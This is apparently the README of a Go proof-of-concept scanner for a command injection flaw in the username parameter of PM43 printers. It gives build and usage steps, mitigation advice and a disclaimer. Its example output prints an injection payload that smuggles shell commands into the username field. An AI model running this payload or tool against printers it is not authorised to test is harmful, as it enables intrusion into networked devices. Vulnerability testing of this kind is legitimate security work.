# PM43 Command Injection Vulnerability (CVE-2023-XXXX) - Usage Instructions

This repository contains a Proof of Concept (POC) code written in Go (Go version 1.17) to test and demonstrate the command injection vulnerability in PM43 printers with firmware version P10.11.013310 and earlier.

## Prerequisites
- Go 1.17 or higher installed on your machine.

## Installation
1. Clone the repository to your local machine:
   ```shell
   $ git clone https://github.com/R0OtAdm1n/pm43-username-rce-poc.git
   ```

2. Change into the project directory:
   ```shell
   $ cd pm43-username-rce-poc
   ```

3. Build the POC code:
   ```shell
   $ go build
   ```

## Usage
1. Run the POC code with the target URL:
   ```shell
   $ ./pm43-username-rce-poc -url <target-url>
   ```

   Replace `<target-url>` with the URL of the PM43 printer you want to test. This will send a crafted payload to the `username` parameter and check for command injection vulnerabilities.

2. Review the results:
   - If a vulnerability is detected, the POC code will display a success message along with the payload used.
   - If no vulnerability is detected, a failure message will be displayed.

## Example
```shell
$ ./pm43-username-rce-poc -url https://printer.example.com
[*] Testing single URL: https://printer.example.com
[+] Command Injection Vulnerability Detected!
[*] Payload: POC%0Aecho -e "\n";expr 12345 \* 2;echo -e "\n"%0A
```

## Mitigation
To mitigate the command injection vulnerability in PM43 printers, it is recommended to update the firmware to the latest version provided by the manufacturer. Ensure that the firmware is regularly updated to address security vulnerabilities and follow best practices for securing network-connected printers.

## Disclaimer
This POC code is intended for educational and testing purposes only. Use it responsibly and with proper authorization. The author assumes no liability for any misuse or damage caused by this code.

## Reporting Vulnerabilities
If you discover any security vulnerabilities or have any security concerns regarding PM43 printers, please contact the printer manufacturer or their security team to report the issues responsibly.